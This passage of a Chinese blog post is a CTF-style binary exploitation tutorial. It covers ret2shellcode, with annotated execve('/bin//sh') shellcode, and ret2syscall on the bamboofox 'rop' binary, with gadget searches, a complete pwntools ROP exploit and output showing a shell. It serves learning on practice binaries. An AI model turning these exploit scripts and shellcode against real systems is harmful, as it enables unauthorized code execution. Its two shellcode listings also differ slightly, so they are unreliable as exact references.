+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2shellcode'</span><span class="token punctuation">)</span>
+<span class="token comment">#shell = asm(shellcraft.sh())</span>
+shell <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
+xor rdx, rdx
+xor rsi, rsi
+mov rbx, 0x68732f2f6e69622f
+push rbx
+push rsp
+pop rdi
+mov al, 59
+syscall'''</span><span class="token punctuation">)</span>
+
+offset <span class="token operator">=</span> <span class="token number">120</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'buf2 address:'</span><span class="token punctuation">)</span>
+buf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> shell<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">b'\x90'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>offset<span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">xor rdx, rdx                    ; rdx &#x3D; 0，作为 execve 第三个参数 envp &#x3D; NULL（用 xor 避免机器码出现空字节）
+xor rsi, rsi                    ; rsi &#x3D; 0，作为 execve 第二个参数 argv &#x3D; NULL（同样避免空字节）
+push rsi                        ; 把 rsi（0）压栈，在栈上放一个 \x00 作为字符串终止符
+mov rbx, 0x68732f2f6e69622f     ; rbx &#x3D; &quot;&#x2F;bin&#x2F;&#x2F;sh&quot; 的 8 字节小端值（2f 62 69 6e 2f 2f 73 68）
+push rbx                        ; 把 &quot;&#x2F;bin&#x2F;&#x2F;sh&quot; 压栈，此时栈顶是字符串内容
+push rsp                        ; 把当前栈指针 rsp 压栈
+pop rdi                         ; 弹出到 rdi，等价 mov rdi, rsp，rdi 指向栈上的 &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;，作为 execve 第一个参数（文件名）
+xor eax, eax                    ; eax &#x3D; 0，清空 rax 高位，保证系统调用号只有低 8 位有效
+mov al, 59                      ; al &#x3D; 59，即 execve 在 x86-64 Linux 的系统调用号
+syscall                         ; 触发系统调用，执行 execve(rdi, rsi, rdx) &#x3D; execve(&quot;&#x2F;bin&#x2F;&#x2F;sh&quot;, NULL, NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h4><p>操作系统的进程空间分为用户空间和内核空间，内核空间需要更高的权限，系统调用就是运行在用户空间的程序向操作系统内核请求需要更高权限运行的<strong>内核函数</strong></p>
+<p>当用户态进程发起一个系统调用，<code>CPU</code>切换到内核态并开始执行一个内核函数。由于系统调用处理函数只有一个，所以需要通过<code>rax</code>传递系统调用号确定调用的函数</p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>应用程序在用户态准备好调用参数（包括系统调用号和函数参数），在<code>64</code>位程序中执行<code>syscall</code>或在<code>32</code>位程序中执行<code>int 80</code>触发软中断，<code>CPU</code>被软中断打断后执行对应中断处理函数，最后执行<code>ret</code>指令切换回用户态</p>
+<p>常用系统调用号：</p>
+<pre class="line-numbers language-none"><code class="language-none">32&#96;位  &#96;read 3 		 open 5		write 4 	 sigreturn 77&#x2F;0x4D		execve 11&#x2F;0xb
+64&#96;位  &#96;read 0 	     open 2		write 1 	 sigreturn 15&#x2F;0xF   execve 59&#x2F;0x3b
+execve&#96;用法：&#96;execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这里我们继续以 bamboofox 中的 ret2syscall 为例。 </p>
+<blockquote>
+<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
+</blockquote>
+<p>首先检测程序开启的保护：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">🐑🍻🐆➜  ret2syscall checksec rop 
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/pipi/Desktop/stack_pwn/ret2syscall/rop'</span>
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
+    Stripped:   No
+    Debuginfo:  Yes
+🐑🍻🐆➜  ret2syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里观察开启了NX保护</p>
+<p>对程序进行IDA查看</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-64h] BYREF</span>
+
+  <span class="token function">IO_setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">IO_setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">IO_puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">IO_puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">IO_gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>依旧能发现危险函数gets，按之前的gdb动态可以测试出其溢出覆盖ebp为112，本次syscall的攻击手法就是借助gadgets来获取shell由于本次是32位所以我们需要的系统中断就是<code>int 0x80 </code></p>
+<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p>
+<pre class="line-numbers language-none"><code class="language-none">execve(&quot;&#x2F;bin&#x2F;sh&quot;,NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>推荐网址</p>
+<p><a target="_blank" rel="noopener" href="https://syscall.sh/">https://syscall.sh/</a></p>
+<p><img src="/image-20261025175849318-17929294827732.png"></p>
+<p>其中，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb   这里0xb 就是11 属于32位 execve的调用号不清楚可以查上面的网址</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在  eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets  最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p>
+<h3 id="收集gadgets"><a href="#收集gadgets" class="headerlink" title="收集gadgets"></a>收集gadgets</h3><p>首先，我们来寻找控制 eax 的 gadgets</p>
+<pre class="line-numbers language-none"><code class="language-none">🐑🍻🐆➜  ret2syscall ROPgadget --binary rop --only &quot;ret|pop&quot; | grep eax
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+🐑🍻🐆➜  ret2syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里可以拿 0x080bb196 : pop eax ; ret</p>
+<pre class="line-numbers language-none"><code class="language-none">🐑🍻🐆➜  ret2syscall ROPgadget --binary rop --only &quot;ret|pop&quot; | grep ebx
+0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+0x080be23f : pop ebx ; pop edi ; ret
+0x0806eb69 : pop ebx ; pop edx ; ret
+0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret      &lt;-- 这里包含三个参数
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+0x0805c820 : pop esi ; pop ebx ; ret
+0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0807b6ed : pop ss ; pop ebx ; ret
+🐑🍻🐆➜  ret2syscall <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里发现 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 这条指令可以连续控制三个参数比较省事情</p>
+<p>那么接下来再找int 0x80 和 &#x2F;bin&#x2F;sh</p>
+<pre class="line-numbers language-none"><code class="language-none">🐑🍻🐆➜  ret2syscall ROPgadget --binary rop --only &#39;int&#39;
+Gadgets information
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+0x08049421 : int 0x80
+0x080890b5 : int 0xcf
+🐑🍻🐆➜  ret2syscall ROPgadget --binary rop --string &quot;&#x2F;bin&#x2F;sh&quot; 
+Strings information
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+0x080be408 : &#x2F;bin&#x2F;sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以编写攻击脚本了</p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
+p &#x3D; process(&quot;.&#x2F;rop&quot;)
+#0x080bb196 : pop eax ; ret
+#0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+#0x08049421 : int 0x80
+#0x080be408 : &#x2F;bin&#x2F;sh
+pop_eax_ret &#x3D; 0x080bb196
+pop_edx_ecx_ebx_ret &#x3D; 0x0806eb90
+sh &#x3D; 0x080be408
+syscall &#x3D; 0x08049421
+payload &#x3D; b&#39;a&#39;*112+p32(pop_eax_ret)+p32(0xb)
+payload +&#x3D; p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(sh)+p32(syscall)
+p.sendline(payload)
+p.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行结果</p>
+<pre class="line-numbers language-none"><code class="language-none">🐑🍻🐆➜  ret2syscall python3 exp.py
+[+] Starting local process &#39;.&#x2F;rop&#39;: pid 5814
+[*] Switching to interactive mode
+This time, no system() and NO SHELLCODE!!!
+What do you plan to do?
+$ whoami
+pipi
+$  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>一次成功 爽！</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PWN/">
+                                    <span class="chip bg-color">PWN</span>
+                                </a>
+                            
+                                <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">二进制安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">放着玩玩你真扫我真要</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        
+                        
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                        
+                    </ul>
+                    
+                    
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2026/10/23/TP-Link-SR20-v1/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="TP-Link SR20 v1">
+                        
+                        <span class="card-title">TP-Link SR20 v1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            TP-Link SR20 v1
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2026-10-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/IoT%E5%AE%89%E5%85%A8/" class="post-category">
+                                    IoT安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/IoT%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">IoT安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2026/07/13/arm14%E9%81%93/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="arm14道">
+                        
+                        <span class="card-title">arm14道</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            14 道 ARM 汇编题的完整题解
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-07-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" class="post-category">
+                                    二进制安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">二进制安全</span>
+                    </a>
+                    
+                    <a href="/tags/ARM/">
+                        <span class="chip bg-color">ARM</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">皮皮先生</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/pipiyyb" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="https://space.bilibili.com/1842462664" class="tooltipped" target="_blank" data-tooltip="关注我的B站" data-position="top" data-delay="50">
+        <i class="fab fa-bilibili"></i>
+    </a>
+
+
+
+    <a href="https://www.iotsec-zone.com/profile/2697" class="tooltipped" target="_blank" data-tooltip="我的 iotsec-zone 主页" data-position="top" data-delay="50">
+        <img src="/medias/iotsec-zone.svg" alt="iotsec-zone" style="height: 1.2rem; vertical-align: -2px;">
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+    
+        
+<div id="blogPet" class="blog-pet" data-name="啤啤">
+    <div id="blogPetBubble" class="blog-pet__bubble" role="status" aria-live="polite">
+        <span class="blog-pet__prompt">root@啤啤:~#</span>
+        <span id="blogPetMessage"></span>
+    </div>
+
+    <div class="blog-pet__controls" aria-label="宠物互动">
+        <button class="blog-pet__control" type="button" data-pet-action="pet" title="摸摸头" aria-label="摸摸啤啤的头">
+            <i class="fas fa-hand-sparkles" aria-hidden="true"></i>
+        </button>
+        <button class="blog-pet__control" type="button" data-pet-action="feed" title="喂杯咖啡" aria-label="给啤啤喂杯咖啡">
+            <i class="fas fa-mug-hot" aria-hidden="true"></i>
+        </button>
+        <button class="blog-pet__control" type="button" data-pet-action="close" title="暂时收起" aria-label="收起啤啤">
+            <i class="fas fa-times" aria-hidden="true"></i>
+        </button>
+    </div>
+
+    <button id="blogPetButton" class="blog-pet__button" type="button" aria-label="和啤啤互动">
+        <svg class="blog-pet__svg" viewBox="0 0 180 190" role="img" aria-label="一只抱着终端的电子小豹">
+            <defs>
+                <linearGradient id="blogPetFur" x1="0" y1="0" x2="1" y2="1">
+                    <stop offset="0" stop-color="#ffd477"/>
+                    <stop offset="1" stop-color="#e9a44d"/>
+                </linearGradient>
+                <linearGradient id="blogPetDenim" x1="0" y1="0" x2="0" y2="1">
+                    <stop offset="0" stop-color="#426b86"/>
+                    <stop offset="1" stop-color="#29475f"/>
+                </linearGradient>
+            </defs>
+
